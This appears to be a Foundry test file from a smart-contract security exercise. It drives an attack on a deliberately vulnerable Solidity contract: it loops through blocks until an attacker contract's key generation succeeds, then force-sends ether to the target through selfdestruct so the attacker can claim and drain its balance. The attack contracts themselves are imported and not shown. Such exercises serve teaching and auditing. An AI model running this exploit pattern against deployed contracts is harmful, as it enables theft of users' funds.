// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {VulnerableContract} from "../src/VulnerableContract.sol";
import {Attack} from "../src/attack.sol";
import {Selfdestruct} from "../src/selfdestruct.sol";
contract VulnerableContractTest is Test{
    
    address  public owner = makeAddr("owner");
    address payable public target;
    address  public user1 = makeAddr("user");
    address  public user2 = makeAddr("user2");
    VulnerableContract public vulnerableContract;
    Attack public attacker;
    Selfdestruct public selfdestructcontract;

    function setUp () public {
        // vm.startPrank(owner);
        vulnerableContract = new VulnerableContract{value: 0.001 ether}();
        target = payable(address(vulnerableContract));
    }
    function test1_normal_user_GenKey() public {
        deal(user1, 10 ether);
        vm.startPrank(user1);
        vulnerableContract.genKey{value: 0.001 ether}();

        (uint256 keys, uint256 balances, bool isGenKey) = vulnerableContract.keysAndBalancesAndIsGenKey(user1);
        console2.log(keys, balances, isGenKey);
        vm.expectRevert();
        vulnerableContract.genKey{value: 0.001 ether}();
    }
    function test2_attacker_GenKey() public {
        console2.log("target", target);
        bool ispriviledge = false;
        console2.log("target balance", target.balance);
        while (!ispriviledge) {
            try new Attack{value: 0.001 ether}(target) returns (Attack) {
                // Contract creation succeeded, break out of the loop
                attacker = new Attack{value: 0.001 ether}(target);
                ispriviledge = true;
                break;
            } catch {
                // Contract creation failed, continue the loop
                // You can add additional handling or logging here if needed
                vm.roll(block.number + 1);
                console2.log("Contract creation failed, continue the loop");
            }
        }
        
    }
    function test3_claimDeopsit() public {
        this.test2_attacker_GenKey();
        vm.expectRevert();
        attacker.claimDeposit();
        selfdestructcontract = new Selfdestruct{value: 0.001 ether}();
        console2.log("target balance before destroy", target.balance);
        selfdestructcontract.destroy(target);
        console2.log("target balance after destroy", target.balance);
        console2.log("attacker balance before claim", address(attacker).balance);
        attacker.claimDeposit();
        console2.log("target balance after claim", target.balance);
        console2.log("attacker balance after claim", address(attacker).balance);
    }

}